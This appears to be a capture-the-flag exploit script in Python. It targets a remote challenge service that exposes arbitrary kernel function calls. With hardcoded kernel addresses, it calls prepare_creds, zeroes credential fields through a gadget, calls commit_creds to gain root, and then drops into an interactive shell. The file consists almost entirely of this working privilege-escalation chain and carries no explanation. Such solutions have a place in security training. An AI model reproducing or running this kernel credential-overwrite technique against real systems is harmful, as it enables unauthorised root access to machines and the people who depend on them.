#!/usr/bin/env python

from chdrft.cmds import CmdsList
from chdrft.main import app
from chdrft.utils.cmdify import ActionHandler
from chdrft.utils.misc import Attributize
import chdrft.utils.misc as cmisc
import glog
from chdrft.tube.connection import Connection
import re

global flags, cache
flags = None
cache = None


def args(parser):
  clist = CmdsList().add(test)
  ActionHandler.Prepare(parser, clist.lst)


class Client:
  def __init__(self, conn):
    self.conn = conn
    conn.recv_until('1. Call')

  def call(self, addr, arg):
    self.conn.send(f'1\n{addr}\n{arg}\n')
    res = self.conn.recv_until('1. Call').decode()
    return int(re.search('It is: (\\w+)', res).group(1), 16)



def test(ctx):
  print('on test')
  prepare_creds=0xffffffff8104ed20
  commit_creds=0xffffffff8104e9d0
  zero_gadget = 0xffffffff81000000 + 0x00000000000dd773
  print(prepare_creds)
  print(commit_creds)
  print(hex(zero_gadget))
  data=0xffff88000212d240
  print(zero_gadget)

  with Connection('arcade.fluxfingers.net', 1817) as conn:
    client= Client(conn)
    credaddr = client.call(prepare_creds, 0)
    for i in range(5):
      client.call(zero_gadget, credaddr + 0x14 + i * 8)
    client.call(commit_creds, credaddr)
    conn.interactive()


def main():
  ctx = Attributize()
  ActionHandler.Run(ctx)


app()
